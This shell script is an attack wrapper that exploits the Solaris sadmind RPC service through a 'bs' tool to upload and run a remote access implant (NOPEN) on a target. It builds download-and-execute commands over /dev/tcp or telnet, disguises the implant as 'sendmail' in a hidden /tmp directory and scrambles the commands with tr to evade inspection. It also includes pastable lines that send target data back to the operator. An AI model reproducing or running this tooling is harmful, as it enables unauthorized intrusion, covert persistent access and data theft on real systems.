#!/bin/sh
# Defaults
PROG=`basename ${0}`
VER="2.10.1.4"
ERRSLEEP=0
[ "$TUNNELPORT" ] || TUNNELPORT=`cat /current/bin/.tunnelport 2>/dev/null`
[ "$TUNNELPORT" ] || TUNNELPORT=18787
COLOR_SUCCESS="\\033[1;32m"
COLOR_FAILURE="\\033[1;31m"
COLOR_WARNING="\\033[1;33m"
COLOR_NORMAL="\\033[0;39m"
COLOR_NOTE="\\033[0;34m"
COLOR_WHITE="\\033[4;97m"
SETCOLOR_SUCCESS="echo -en $COLOR_SUCCESS"
SETCOLOR_FAILURE="echo -en $COLOR_FAILURE"
SETCOLOR_WARNING="echo -en $COLOR_WARNING"
SETCOLOR_NORMAL="echo -en $COLOR_NORMAL"
SETCOLOR_NOTE="echo -en $COLOR_NOTE"
SETCOLOR_WHITE="echo -en $COLOR_WHITE"
# usagetext here so this can be used globally 
DEFCALLBACKDELAY=15
SYNTAX="  [E=ratpreargs] [A=ratpostargs] \\
       $PROG [options] remoteHost [remoteDomain]
"
usagetextshort="
Usage:
$SYNTAX
$PROG uploads and runs NOPEN via ./bs.

REQUIRED OPTIONS - Usual upload/execute mode

-i IP    Target IP (or 127.0.0.1 if redirecting)
-u #     Target's udp sadmind (prog 100232) port

TROUBLESHOOT OPTION

-R       Run specific commands on target, not the usual (you are
         prompted for the command string to send). OTHER OPTIONS below
         are ignored when using -R.

OTHER OPTIONS - [default in brackets if any]

-n #     Local tcp port for netcat upload [random]
-l IP    Local IP for netcat upload [the first active IP in this order:
                                     ppp0, ppp1, eth0 or eth1]
-r name  Name to call uploaded file on target [sendmail]
-D dir   Working directory to create/use on target [/tmp/.scsi]
-p #     NOPEN port for either listen or callback mode [random]
-c       Use NOPEN in callback mode to local IP (also see -S)
-C IP    Use NOPEN in callback mode to this IP instead of local IP
-s #     Change delay used for -c|C to # seconds [$DEFCALLBACKDELAY]
-t       Use the OLDCMD/telnet/uudecode method instead of the default
         CMD/ksh.$COLOR_FAILURE NOTE: This DOES require uudecode.$COLOR_NORMAL
-T       Do NOT use tr at all (can be used with or without -t)
-z       Do NOT use uncomrpess at the far end (so you should not use
         compress here)
-P       Assume PATH=. will fail so use ./ratname
-S name  Script file to write and remove when using -t (OLDCMD) method
-G       Retry exploit--using already uploaded RAT (useful when you need
         to try adding -P option or try another RAT callback port).

"
usagetext="$usagetextshort
In the usual upload/execute mode, unless the -T option is used, $PROG
uses the remote system's tr program (see \"man tr\") to unmunge the
string sent via bs into the commands we want him to execute. See dtail
below. $PROG will build and show the munged and unmunged strings,
prompting to abort or continue before any packets are sent.

NOTE: The environment variables E and A are still usable as:
                  E=ratpreargs              A=ratpostargs

     BUT, they are no longer necessary for NOPEN ports and callbacks.

     ratpreargs  : a string put on remote command line right after
                   PATH=. and before remoteName (NOTE: If using -l/c
                   options above this is no longer necessary.)
 
     ratpostargs : a string put on remote command line after running
                   remoteName (e.g., \" ; rm sendmail\")

     Command sent to bs will be munged (unless -T is used) from one of:

OLDCMD=\"cd /tmp;mkdir -p \${REMOTE_DIR} && cd \${REMOTE_DIR};telnet \${LOCAL_IP} \${LOCAL_PORT} < /dev/console | uudecode > /dev/null 2>&1 && uncompress -f \${REMOTE_FNAME}.Z && chmod 755 \${REMOTE_FNAME} && PATH=.\${RAT_PREARGS} \${DOTSLASH}\${REMOTE_FNAME}\${RAT_POSTARGS}\"

CMD=\"cd /tmp;mkdir -p \${REMOTE_DIR} && cd \${REMOTE_DIR};/bin/ksh -c \"cat < /dev/tcp/\${LOCAL_IP}/\${LOCAL_PORT} > \${REMOTE_FNAME}.Z && uncompress -f \${REMOTE_FNAME}.Z && chmod 755 \${REMOTE_FNAME} && PATH=.\${RAT_PREARGS} \${DOTSLASH}\${REMOTE_FNAME}\${RAT_POSTARGS}\"\"

OR if -T is used, one of these will be used but will not be munged.

$PROG Version $VER
"
note() {
    unset N
    if [ "$1" = "-n" ] ; then
      N=$1
      shift
    fi
    echo -e $N "$COLOR_NOTE${*}$COLOR_NORMAL"
}
notered() {
    unset N
    if [ "$1" = "-n" ] ; then
      N=$1
      shift
    fi
    echo -e $N "$COLOR_FAILURE${*}$COLOR_NORMAL"
}
tunnelcmd() {
    echo "${*}"	| nc -w1 -u 127.0.0.1 $TUNNELPORT
}
usage() {

    [ "$1" = "exit" ] && EXIT=1 && shift
    if [ "$1" = "-h" ] ; then
	shift
	[ "$ERRSTR" ] || ERRSTR="\nNOTE: \a THE NEW WAY REQUIRES NO UU*CODE NOR ANY E=\"ratpreargs\"!!!!"
	echo -e "$usagetext"
    fi
    if [ "$1" = "-v" ] ; then
	echo "$PROG version $VER"
	shift
    fi
    ERRSTR="${*}"
    if [ "$ERRSTR" ] ; then
	notered "\a${ERRSTR}"
    fi
    [ "$EXIT" ] && exit
} # end usage

doit() {
    RETRYONLY=0
    CMDLINE="\nCommandLine: ${0} ${*}"
    CALLBACKDELAY=$DEFCALLBACKDELAY
    # lab testing?
    ifconfig 2>&1  | grep "555.1\.2\." > /dev/null && CALLBACKDELAY=4
    unset NOPENPORT CALLBACKIP CALLBACK OLDCMD NO_TR NOZIP PACKARGS DOTSLASH CMDOVERRIDE SCRIPT
    unset UNCOMPRESS REDIRECT UUARG REMOTE_DOMAIN PACKRAT_SCRIPME
    while getopts p:cl:ths:zPvRu:s:Ti:n:r:D:P:a:S:C:RG op; do
	case $op in
            h)  usage exit -h ;;
            v)  usage exit -v ;;
    i) REMOTE_IP="${OPTARG}";;
    n) LOCAL_PORT="$OPTARG" ;;
    l) LOCAL_IP="$OPTARG";;
    r) REMOTE_FNAME="$OPTARG" ;;
    D) REMOTE_DIR="$OPTARG" ;;
    p) NOPENPORT="$OPTARG";;
    a) [ "$ARCH" ] || ARCH="$OPTARG";;
    u)  SADMIND_PORT="$OPTARG"
	SADMIND_ARG="-p $OPTARG" ;;
	    E)  RAT_PREARGS=" $OPTARG";;
	    A)  RAT_POSTARGS=" $OPTARG";;
	    C)  CALLBACKIP="$OPTARG";;
	    c)  CALLBACK=" callback";;
	    t)  OLDCMD="yes";;
	    T)  NO_TR="yes";;
	    s)  CALLBACKDELAY="$OPTARG";;
	    z)  NOZIP=yes
		PACKARGS=" -z" ;;
	    P)  DOTSLASH="./";;
	    R)  CMDOVERRIDE=yes ;;
            S)  SCRIPT="$OPTARG" ;;
	    G)  RETRYONLY=1 ;;
	esac
    done
    unset NOSERVER
    if [ "$ARCH" ] ; then
	NOSERVER=`ls -1 /current/up/morerats/noserver*solaris-2.6 2>/dev/null | grep -i ${ARCH} | tail -1`
    fi
    [ "$NOSERVER" ] || NOSERVER=/current/up/noserver

    shift `expr $OPTIND - 1`
    [ "$#" -eq 0 -a ! "$REMOTE_IP" ] && usage exit -h
    [ "$1" ] && REMOTE_HOST="-h ${1}"
    [ "$2" ] && REMOTE_DOMAIN="-d ${2}"
    # fixed defaults here (random ports and such elsewhere)
    [ "$SCRIPT" ] || SCRIPT="...."
    [ "$REMOTE_FNAME" ] || REMOTE_FNAME=sendmail
    [ "$REMOTE_DIR" ] || REMOTE_DIR=/tmp/.scsi
    if [ ! "$CMDOVERRIDE" ] ; then
	if [ ! "$NOPENPORT" ] ; then
	    NOPENPORT=`mkrandom -n 2>/dev/null`
	fi
	if [ ! "$NOPENPORT" ] ; then
	    usage "mkrandom not in path--needed to generate random port for NOPEN\n(use -p # to force a particular port)"
	    return
	fi
    fi


    [ "$E" ] && RAT_PREARGS=" $RAT_PREARGS $E" && echo "RAT_PREARGS=\"$RAT_PREARGS\""
    [ "$A" ] && RAT_POSTARGS=" $RAT_POSTARGS $A" && echo "RAT_POSTARGS=\"$RAT_POSTARGS\""
    echo ""

    [ "$HOSTERR" ] && REMOTE_HOST="-h ${HOSTERR}"



    # show what we were called with
    echo -e "$CMDLINE"

    # Check to make sure tcp LISTEN is there
    PORTS=`netstat -an | grep tcp.*LIST | cut -f 2 -d ":" | sort -rn | awk '{print $1}' |egrep -v "6000"`
    if [ "$NOPENPORT" ] ; then
	note "Using random NOPEN$CALLBACK port $NOPENPORT"
    fi
    
    note Local ports LISTENing: $PORTS
    echo
    which packrat >/dev/null 2>&1
    NOPACKRAT=$?
    [ "$NOPACKRAT" = "0" ] || usage exit "No packrat in your path"
    
    if [ ! "$CMDOVERRIDE" -a $RETRYONLY == 0 ] ; then
	if [ "$TARGETIP"  ] ; then
	    # autoattack mode so yes we want packrat
	    PACKRAT_SCRIPME=yes
	else
	    if [ "$LOCAL_PORT" ] ; then
		for i in $PORTS -1 ; do
		    [ "$i" = "$LOCAL_PORT" ] && break
		done
		if [  $i -lt 0 ] ; then
		    PACKRAT_SCRIPME=yes
		else
		    notered "\aLocalPort=$LOCAL_PORT provided on command line already LISTENing. Assuming that is the upload."
		    sleep 2
		fi
	    else
		while [ 1 ] ; do
		    LOCAL_PORT=`mkrandom -n 2>/dev/null`
		    [ ! "$LOCAL_PORT" ] && usage exit "mkrandom not in path--needed to generate random rat upload port"
		    ALREADYTHERE=`netstat -an | grep tcp.*LIST | grep ":$LOCAL_PORT "`
		    note "Using a random port ($LOCAL_PORT) for local RAT upload listener (packrat)"
		    PACKRAT_SCRIPME=yes
		    [ "$ALREADYTHERE" ] || break
		done
	    fi
	fi
	for pid in `pidof nc` ; do
	    UULISTEN=`ls -al /proc/$pid/fd | grep \.uu`
	    if [ "$UULISTEN" -a ! "$OLDCMD" ] ; then
		usage exit "NOT GOOD: Your netcat LISTEN seems to be sending a .uu file--DO NOT (see usage):
	    # ls -al /proc/$pid/fd | grep \.uu\n$UULISTEN"
	    fi
	done
    fi # if ! $CMDOVERRIDE -o $RETRYONLY == 1
    if [ ! "$LOCAL_IP" ] ; then
	if [ ! "`which grepip 2>/dev/null`" ] ; then
	    notered "\aMust have \"grepip\" in path or provide -l IP on command line"
	    exit
	fi
	for INT in ppp0 ppp1 eth0 eth1 ; do 
	    ADDR=`ifconfig $INT 2>/dev/null | grepip | egrep -v "255|127\.0" | head -1`
	    [ "$ADDR" ] && LOCAL_IP=$ADDR
	    [ "$LOCAL_IP" ] && break
	done
	while [ ! "$LOCAL_IP" ] ; do
	    echo -en "What is your local/redirector IP address? "
	    [ "$LOCAL_IP" ] && echo -en "[$LOCAL_IP] "
	    read ans
	    [ "$ans" -a "${ans:0:1}" != "y" -a "${ans:0:1}" != "Y" ] && \
		LOCAL_IP=$ans
	    LOCAL_IP=`echo $LOCAL_IP | grepip`
	    [ "$LOCAL_IP" ] || echo -e "\n\n\a$ans is not a valid IP. Try again.\n\n"
	done
	INT=" ($INT)"
	note "Using $LOCAL_IP$INT for -l local IP argument"
    fi
    [ "$REMOTE_HOST" ] || usage exit "Error: missing remote host argument"

    # Check for required args
    [ -z "$REMOTE_IP" ] && usage exit "Error: missing remote IP (-i)"
    [ -z "$REMOTE_HOST" ] && usage exit "Error: missing remote hostname"
    [ -z "$SADMIND_ARG" ] && usage exit "Error: missing sadmindPort (-u)"
    if [ ! "$CMDOVERRIDE" ] ; then
	[ -z "$REMOTE_DIR" ] && usage exit "Error: missing remote directory (-D)"
	[ "${REMOTE_DIR:0:1}" = "/" ] ||
	    usage exit "\a\nREMOTEDIR ($REMOTE_DIR) must start with \"/\". Check # of args and order."
	[ -z "$REMOTE_FNAME" ] && usage exit "Error: missing remote filename (-r)"
	[ -z "$LOCAL_IP" ] && usage exit "Error: missing local IP (-l)"
	if [ $RETRYONLY == 0 ] ; then
	    [ -z "$LOCAL_PORT" ] && usage exit "Error: missing local port (-n)"
	fi
    fi
    if [ "${REMOTE_IP:0:3}" = "127" ] ; then
	REDIRECT=yes
	ifconfig -a | grep $LOCAL_IP > /dev/null && NOTGOOD=yes
	if [ "$NOTGOOD" ] ; then
	    $SETCOLOR_FAILURE
	    echo -e "ARE YOU SURE? It looks like you are redirecting (due to remote being $REMOTE_IP),
and yet you want the RAT callback to go to $LOCAL_IP, WHICH\a IS ONE OF YOUR LOCAL IPs???"
	    sleep 1
	    echo -en "\nHit ^C to abort or enter to continue DESPITE THIS PROBLEM!!\a"
	    $SETCOLOR_NORMAL
	    read blah
	fi
	if [ "$TARGETIP" ] ; then
	    DEFTARGET=$TARGETIP
	else
	    DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`
	fi
	[ ! "$ACTUALTARGET" ] && [ "$DEFTARGET" ] && [ "$TARGETIP" ] && ACTUALTARGET=$DEFTARGET
	until [ `echo $ACTUALTARGET | grepip 2>/dev/null` ] ; do
	    [ "$ACTUALTARGET" ] && echo Bad IP $ACTUALTARGET
	    echo -en "\nEnter Target IP after redirecting through $LOCAL_IP: "
	    [ "$DEFTARGET" ] &&  echo -en "[$DEFTARGET] " 
	    read ACTUALTARGET
	    [ ! "$ACTUALTARGET" ] && [ "$DEFTARGET" ] && ACTUALTARGET=$DEFTARGET
	done
	note Redirecting via 127.0.0.1/$LOCAL_IP to $ACTUALTARGET
	if [ "$TARGETIP" ] ; then
	    # This is set by autoattack which means domainname may still be needed
	    echo -en "\nEnter domainname to use if any: "
	    read D
	    [ "$D" ] && REMOTE_DOMAIN="-d ${D}"
	else
	    while [ 1 ] ; do
		OKTUNNEL=`netstat -an | egrep "^udp.*0 (0.0.0.0|127.0.0.1):$TUNNELPORT "`
		if [ ! "$OKTUNNEL" ] ; then
		    notered "You must start a -tunnel in a NOPEN window on udp/$TUNNELPORT:\n"
		    note "\n-tunnel $TUNNELPORT udp\n\n"
		    notered -n "Hit return once the -tunnel is up"
		    read input
		fi
		[ "$OKTUNNEL" ] && break
	    done
	fi
    fi

    if [ "$PACKRAT_SCRIPME" ] ; then
	[ "$OLDCMD" ] || UUARG="-u"
	EXPLOIT_SCRIPME="packrat$PACKARGS $UUARG $REMOTE_FNAME $NOSERVER $LOCAL_PORT"
	note "Starting local packrat LISTENer to send noserver via port $LOCAL_PORT"
	export EXPLOIT_SCRIPME
	echo EXPLOIT_SCRIPME=\"$EXPLOIT_SCRIPME\"  scripme -t PACKRAT -F -X \"-bg slategrey -fg white -geometry 131x55-0+0\"
	EXPLOIT_SCRIPME="$EXPLOIT_SCRIPME" scripme -t PACKRAT -F -X "-bg slategrey -fg white -geometry 131x55-0+0"
    fi
    if [ "$CALLBACK" -a ! "$CALLBACKIP" ] ; then 
	CALLBACKIP="$LOCAL_IP"
    else
	if [ "$CALLBACK" -a ! "$LOCAL_IP" = "$CALLBACKIP" ] ; then
	    note "-C argument given for callback--overriding -l local IP from command line: $LOCAL_IP"
	fi
    fi

    if [ "$CALLBACK" ] ; then
	RAT_PREARGS=" S=$CALLBACKDELAY D=\"-uc${CALLBACKIP}:${NOPENPORT}\""
	if [ "$REDIRECT" ] ; then
	    notered "\aYou must establish a NOPEN listener on $CALLBACKIP:$NOPENPORT\n\n"
	    PASTABLE=`grep -v "^#" /current/down/didthis 2>/dev/null | grep "noclient.*$CALLBACKIP"`
	    [ "$PASTABLE" ] && PASTABLE="\ncd /current/down\n${PASTABLE}"
	    ifconfig -a | grep $CALLBACKIP && ITSLOCAL=yes
	    if [ "$ITSLOCAL" ] ; then
		echo "remote nopen window on $CALLBACKIP AND local listener:"
		note "\ncd /current/down/\n${PASTABLE}\n/current/bin/noclient -l $NOPENPORT\n\n"
	    else
		echo "remote nopen window on $CALLBACKIP:"
		note "${PASTABLE}\n\n-nrtun $NOPENPORT\n\n"
#		PASTABLE=`grep -v "^#" /current/down/didthis 2>/dev/null | grep "noclient.*$CALLBACKIP" | sed "s/noclient/noclient -c \"-nrtun $NOPENPORT\"/"`
#		EXPLOIT_SCRIPME="${PASTABLE}" scripme -t NOCLIENT -F -X " -geometry 131x55"

	    fi
	    notered -n "Hit ^C to abort or enter once NOPEN callback window is ready"
	    read blah
	else # not redirecting
	    POSTRUN="noclient -l $NOPENPORT"
	fi
    else # not callback
	RAT_PREARGS=" D=\"-ul${NOPENPORT}\""
	if [ "$REDIRECT" ] ; then
	    POSTRUN2="-nstun $ACTUALTARGET ${NOPENPORT}"
	else
	    POSTRUN2="noclient ${REMOTE_IP}:${NOPENPORT}"
	fi
    fi

    if [ ! "$CMDOVERRIDE" ] ; then
	if [ ! "$NOZIP" ] ; then
	    UNCOMPRESS="&& uncompress -f ${REMOTE_FNAME}.Z"
	    [ "$OLDCMD" ] || UNCOMPRESS=".Z&&uncompress -f ${REMOTE_FNAME}.Z"
	    
	fi
	# this one has more spaces...don't use unless other fails...
	CMD="mkdir -p ${REMOTE_DIR} && cd ${REMOTE_DIR} && telnet ${LOCAL_IP} ${LOCAL_PORT} < /dev/console | uudecode > /dev/null 2>&1${UNCOMPRESS}&& chmod 755 ${REMOTE_FNAME} && PATH=.${RAT_PREARGS} ${DOTSLASH}${REMOTE_FNAME}${RAT_POSTARGS}"
    
	CMD="mkdir -p ${REMOTE_DIR}&&cd ${REMOTE_DIR}&&/bin/ksh -c \"/bin/cat < /dev/tcp/${LOCAL_IP}/${LOCAL_PORT} > ${REMOTE_FNAME}${UNCOMPRESS}&&chmod 755 ${REMOTE_FNAME}&&PATH=.${RAT_PREARGS} ${DOTSLASH}${REMOTE_FNAME}${RAT_POSTARGS}\""
	if [ "$OLDCMD" ] ; then
	    CMD="mkdir -p ${REMOTE_DIR}&&cd ${REMOTE_DIR}&&telnet ${LOCAL_IP} ${LOCAL_PORT}</dev/console|uudecode>/dev/null 2>&1 ${UNCOMPRESS}&&PATH=.${RAT_PREARGS} ${DOTSLASH}${REMOTE_FNAME}${RAT_POSTARGS}"
	fi
	if [ $RETRYONLY == 1 ] ; then
	    CMD="cd /tmp;cd ${REMOTE_DIR};PATH=.${RAT_PREARGS} ${DOTSLASH}${REMOTE_FNAME}${RAT_POSTARGS}"
	fi
    else
	CMD=""
	$SETCOLOR_NOTE
	[ ! "$REMOTE_DIR" = "/tmp" ] && TMP=" rm -rf ${REMOTE_DIR} ; ls -arlt /tmp ;"
	[ ! "$TMP" ] && TMP=" rm -rf ${REMOTE_DIR}/$REMOTE_FNAME ;"
	echo -e "You may want to start something like this locally (YOU do this netcat--it is not automatic):\n"
	notered "LOCALLY:"
	echo -e "  nc -l -p 443"
	echo ""
	notered "Some pastable examples for the REMOTE end (pick one, or mix and match--up to you):"
	echo -e "  ksh -c \"( w ; uname -a ) > /dev/tcp/$LOCAL_IP/443\""
	echo -e "  ( w ; uname -a ) | telnet $LOCAL_IP 443"
	echo -e "  ksh -c \"($TMP ls -alrt ${REMOTE_DIR} ) > /dev/tcp/$LOCAL_IP/443\""
	echo -e "  ($TMP ls -alrt ${REMOTE_DIR} ) | telnet $LOCAL_IP 443"
	echo -e "  ($TMP ls -alrt ${REMOTE_DIR} ) | telnet $LOCAL_IP `mkrandom -n 2>/dev/null`"
	echo ""
	while [ ! "$CMD" ] ; do
	    notered "Enter Commands to run on target (see above examples), separated by \";\".\n"
	    read CMD
	done
	note "\nCommands being run: $CMD\n"
    fi # if $CMDOVERRIDE

# this is unused for now--old bs.tn.gr way
OLDOLDCMD="echo \"
PATH=/usr/openwin/bin:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/gnu/bin:/usr/ucb:/usr/X11R6/bin
export PATH
mkdir -p ${REMOTE_DIR}
cd ${REMOTE_DIR}
(echo 'open ${LOCAL_IP} ${LOCAL_PORT}';/bin/cat)| /bin/telnet | /bin/cat| /usr/bin/uudecode  > /dev/null 2>&1
uncompress -f ${REMOTE_FNAME}.Z
chmod 0700 ${REMOTE_DIR}/${REMOTE_FNAME}
PATH=${REMOTE_DIR}${RAT_PREARGS} ${DOTSLASH}${REMOTE_FNAME}${RAT_POSTARGS}
rm ${SCRIPT}
\" > ${SCRIPT} 
/bin/sh ${SCRIPT}"

    if [ ! "$NO_TR" ] ; then
	# tr sets
	#SET1="'0-}'"
	#SET2="'1-~'"
	ALPHA="ABCDEFGHIJKLMNOPQRSTUVWXYZ./abcdefghijklmnopqrstuvwxyz0123456789 <&"
	THERE=`which permute 2>/dev/null`
	if [ ! "$THERE"  ] ; then
	    if [ -x "../bin/permute" ] ; then
		export PATH=../bin:$PATH
	    else
		usage exit "FATAL ERROR: No \"permute\" in path."
	    fi
	fi
	SET1=`permute "$ALPHA"`
	SET2=`permute "$SET1"`
	MUNGED="`echo "${CMD}" | tr "${SET1}" "${SET2}"`"
	UNMUNGED="`echo \"${MUNGED}\" | tr "${SET2}" "${SET1}"`"
	echo "
munging via:
    tr \"$SET1\" \"$SET2\"
and vice versa.
    
MUNGED=\"$MUNGED\"
    
UNMUNGED=\"$UNMUNGED\"
"

	if [ "$SET1" = "$SET2" ] ; then
	    echo "SET1=\"$SET1\""
	    usage exit "FATAL ERROR. SET1 is the same as SET2."
	fi
	if [ ! "$UNMUNGED" = "$CMD" ] ; then
	    echo "$UNMUNGED" > /tmp/UNMUNGED.$$
	    echo "$CMD" > /tmp/CMD.$$
	    cmp /tmp/UNMUNGED.$$ /tmp/CMD.$$
	    wc /tmp/UNMUNGED.$$ /tmp/CMD.$$
	    usage "FATAL ERROR. UNMUNGE TEST FAILED"
	else
	    echo -e "PASSSED TEST: \$CMD eq \$UNMUNGED.\n"
	fi

	$SETCOLOR_NOTE
	echo -e "Running:\n
bs -i ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_ARG} \
  -c \"echo '${MUNGED}'|tr '${SET2}' '${SET1}'|sh\"\n"
    else
	notered "\a\nNOT MUNGING--CMD going over in the clear.\n\n"
	echo -e "Running:\n
bs -i ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_ARG} \
  -c \"$CMD\"\n"
    fi

    if [ "$POSTRUN" ] ; then
	echo -e "AND THEN the following will start automatically:\n\n$POSTRUN$COLOR_NORMAL\n"
    fi

    notered "Hit ^C to abort or enter to continue"
    read blah
    if [ "$REDIRECT" ] ; then
	note "Sending tunnel commands to 127.0.0.1:$TUNNELPORT"
	if [ $ATTEMPT -eq 1 ] ; then
# tunnelcmd c 1 2
	  tunnelcmd u $SADMIND_PORT $ACTUALTARGET
	else
	  tunnelcmd c 2
	fi
	[ $RETRYONLY == 0 ] && tunnelcmd r $LOCAL_PORT
	tunnelcmd s
    fi
    while [ 1 ] ; do
	# Now check what we can before continuing
	echo ""
	while [ 1 ] ; do
	    if [ "$CALLBACK" ] ; then
		if [ "$REDIRECT" ] ; then
		    OKNRTUN=`netstat -an | grep "^tcp.*:$NOPENPORT " | egrep "ESTAB|LISTEN"`
		else
		    OKNRTUN=okeydokey
		fi
	    else
		OKNRTUN=okeydokey
	    fi
	    [ "$REDIRECT" ] || OKUDP=okeydokey
	    [ "$REDIRECT" ] && OKUDP=`netstat -an | egrep "^udp.*0 (0.0.0.0|127.0.0.1):$SADMIND_PORT "`
	    OKPACKRAT=`netstat -an | egrep "^tcp.*(0.0.0.0|127.0.0.1):$LOCAL_PORT .*LISTEN"`
	    [ "$CMDOVERRIDE" -o $RETRYONLY == 1 ] && OKPACKRAT=nevermind

	    [ "$OKUDP" ] || notered "No udp/$SADMIND_PORT seen locally in netstat"
	    if [ ! "$OKNRTUN" ] ; then
		notered "No -nrtun or noclient -l for callback seen locally on port $NOPENPORT in netstat"
		note "${PASTABLE}\n\n-nrtun $NOPENPORT\n\n"
	    fi
	    if [ ! "$OKPACKRAT" ] ; then
		if [ "$OKUDP" -a "$OKNRTUN" ] ; then
		    notered "waiting for packrat to start on port $LOCAL_PORT"
		else
		    notered "No packrat seen locally on port $LOCAL_PORT in netstat"
		fi
	    fi
	    [ "$OKUDP" ] && [ "$OKNRTUN" ] && [ "$OKPACKRAT" ] && break
	    
	    [ "$OKUDP" ] && [ "$OKNRTUN" ] && sleep 2 && continue
	    unset OKUDP OKNRTUN OKPACKRAT
	    notered "\a\n\nCANNOT PROCEED"
	    notered "\a\n\nFix this and either ^C or hit Enter to try again."
	    read blah
	done
	rm -f /tmp/bsoutput.$$
	if [ ! "$NO_TR" ] ; then
	    note "\n\nrunning this locally (using tr remotely):\n\nbs -i ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_ARG} \
		-c \"echo '${MUNGED}' | tr '${SET2}' '${SET1}'|sh\" 2>&1 | tee /tmp/bsoutput.$$\n\n"
	    bs -i ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_ARG} \
		-c "echo '${MUNGED}' | tr '${SET2}' '${SET1}'|sh" 2>&1 | tee /tmp/bsoutput.$$
	else
	    note "\n\nrunning this locally:\n\nbs -i ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_ARG} \
		-c \"$CMD\" 2>&1 | tee /tmp/bsoutput.$$\n\n"
	    bs -i ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_ARG} \
		-c "$CMD" 2>&1 | tee /tmp/bsoutput.$$
	fi

	HOSTERR=`grep "Security exception on host" /tmp/bsoutput.$$ | sed "s/.*Security exception on host //" | sed "s/.  USER ACCESS DENIED.*//"`
	rm -f /tmp/bsoutput.$$
	[ "$HOSTERR" ] || break
	$SETCOLOR_FAILURE
	echo -e "\n\nERROR OUTPUT FROM bs!!\n\n"
	if [ "-h $HOSTERR" = "$REMOTE_HOST" ] ; then
	    echo -e "ERROR! Correct host but need different domain (\"$REMOTE_DOMAIN\" failed)."
	    $SETCOLOR_NORMAL
	    echo -en "Enter new domain or ^C to abort (hit enter to try no domain at all): "
	    read ans
	    REMOTE_DOMAIN=""
	    [ "$ans" ] && REMOTE_DOMAIN="-d ${ans}"
	    echo -e "\n\nTrying domain \"$REMOTE_DOMAIN\"\n\n"
	else
	    echo -e "ERROR! Wrong host. They suggest \"$HOSTERR\", so try that."
	    $SETCOLOR_NORMAL
	    echo -en "Enter new host or ^C to abort: [$HOSTERR] "
	    read ans
	    [ "$ans" ] || ans="$HOSTERR"
	    REMOTE_HOST="-h ${ans}"
	    echo -e "\n\nTrying host \"$REMOTE_HOST\"\n\n"
	fi
    done

    if [ "$POSTRUN" ] ; then
	notered "\n\n\aNOTE: Callback will not occur for $CALLBACKDELAY seconds or more"
	notered "      and MAYBE NOT until upload completes AND you ^C the netcat upload.\n\n"
	notered "\nNow running nopen listener with: $POSTRUN\n"
	exec $POSTRUN
    fi

    if [ "$POSTRUN2" ] ; then
	note "\nOnce you see all is done, you may want to proceed with:\n\n$POSTRUN2\n\n"
	[ $RETRYONLY == 0 ] && notered NOTE: Listener may not be active until you ^C the netcat upload.
    fi
} # end doit procedure


# This calls usage if empty args or just -h or -v
[ "${*}" = "-v" -o "${*}" = "-h" -o "${*}" = "" ] && doit ${*}
ATTEMPT=1
while [ 1 ] ; do
    # This is called by autoattack so allow changes
    if [ "$ARGS" ] ; then
	notered "Last attempt used these arguments:\n$COLOR_NORMAL\n${ARGS}\n"
	OPTIND=1
    else
	if [ "$TARGETIP" ] ; then
    	    echo -e "$usagetextshort"

	    notered "Automatic mode has pre-set these arguments:\n$COLOR_NORMAL\n${*}\n"
	fi
	ARGS="${*}"
    fi

    if [ $ATTEMPT -gt 1 -o "$TARGETIP" ] ; then
	notered "\n\nJust hit return to keep these arguments, or input a new and complete argument\nstring to use instead:\n"
	read ans
	if [ "$ans" ] ; then
	    ARGS="$ans"
	    note Changing arguments to: $ARGS
	else
	    note NOT changing arguments
	fi
    fi

    doit $ARGS

    note "\n\n$PROG attempt number $ATTEMPT is complete."
    if [ "$CALLBACK" ] ; then
	$SETCOLOR_FAILURE
	echo -e "\nNOTE: Callback will not happen until $CALLBACKDELAY seconds or more have passed.\n"
	while [ $CALLBACKDELAY -ge 0 ] ; do
	    echo -en "\rCounting down: $CALLBACKDELAY  "
	    CALLBACKDELAY=`expr $CALLBACKDELAY - 1`
	    sleep 1
	done
    fi
    notered "\n\nIf this is your last sploit, you can close down the -tunnel
currently listening on $TUNNELPORT with this at any local prompt:
$COLOR_NORMAL
   /current/bin/closetunnel\n\n"
    note "\nIf it worked, hit return to exit.\n"
    notered -n "Do you want to try again? [N] "
    read ans
    [ ! "$ans" -o "${ans:0:1}" = "n" -o "${ans:0:1}" = "N" ] && break
    # echo -e "$usagetext" 
    
    notered "\nIf \"ksh\" method might have failed, add the -t argument to try the old telnet way."
    notered "If \"tr\" method might have failed, add the -T argument to disable munging."
    notered "If still failing after trying -t, -T and -tT, try bs.tn.gr_USE_WHEN_bs.auto_FAILS."
    note "\nIf desired, use the -C command to override what commands are executed on target."
    note "\nYour previous arguments were:"
    echo "$ARGS"
    notered "\n\nJust hit return to try the same arguments again, or input a new and complete argument\nstring to use (e.g., add -T if you think \"tr\" failed)."

    read ans
    if [ "$ans" ] ; then
	ARGS="${ans}"
    fi
    ATTEMPT=`expr $ATTEMPT + 1`
done
# disabled this for now 20030603
#if [ "$REDIRECT" ] ; then
#    note "Closing down -tunnel ports"
#    tunnelcmd c 1 2
#    tunnelcmd q
#fi
ps -efwwww | grep PACKRAT | grep -v grep && \
notered "\n\nYou need to close packrat window before this one can exit.\n\n"

